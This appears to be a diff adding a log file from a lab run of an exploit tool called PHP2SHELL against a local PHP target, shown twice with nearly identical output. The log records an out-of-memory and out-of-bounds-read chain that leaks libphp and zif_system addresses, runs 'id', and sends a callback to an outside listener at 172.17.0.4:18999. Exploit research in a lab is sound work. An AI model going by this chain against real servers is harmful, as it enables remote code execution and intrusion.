@@ -1,0 +1,28 @@
+
+=== 2026-10-23T03:42:46.957774+00:00 ===
+=== PHP2SHELL official target — pure HTTP ===
+target: http://127.0.0.1:18110/index.php
+outdir: /home/ravhi/randoman/deepjb/php2shell-lab/official-lab/out
+mode: single-worker chain
+[*] exec: id
+[try 1/3] A1: END-cleanup send_cookie OOM
+      A1 body generated; sending chunked END-cleanup OOM
+      B1 body generated; sending chunked stale-id OOB read
+      decoded=819208 zval_ptr_dtor=0x7f83d144cb60 -> libphp=0x7f83d0dee000
+      chunk buckets: [('0x7f83cea00000', 7495), ('0x7f83d1400000', 1095), ('0x7f83cf200000', 87), ('0x7f83ce800000', 79)]
+[try 1] A2 + B2 (1/2): main=0x7f83cf200000 S=0x7f83cf2f8398 zif_system=0x7f83d1253370
+[+] OOB callback dispatched to http://172.17.0.4:18999/; check the listener
+
+=== 2026-10-23T03:43:26.023708+00:00 ===
+=== PHP2SHELL official target — pure HTTP ===
+target: http://127.0.0.1:18110/index.php
+outdir: /home/ravhi/randoman/deepjb/php2shell-lab/official-lab/out
+mode: single-worker chain
+[*] exec: id
+[try 1/3] A1: END-cleanup send_cookie OOM
+      A1 body generated; sending chunked END-cleanup OOM
+      B1 body generated; sending chunked stale-id OOB read
+      decoded=819208 zval_ptr_dtor=0x7f83d144cb60 -> libphp=0x7f83d0dee000
+      chunk buckets: [('0x7f83cea00000', 7495), ('0x7f83d1400000', 1095), ('0x7f83cf200000', 87), ('0x7f83ce800000', 79)]
+[try 1] A2 + B2 (1/2): main=0x7f83cf200000 S=0x7f83cf2f8398 zif_system=0x7f83d1253370
+[+] OOB callback dispatched to http://172.17.0.4:18999/; check the listener
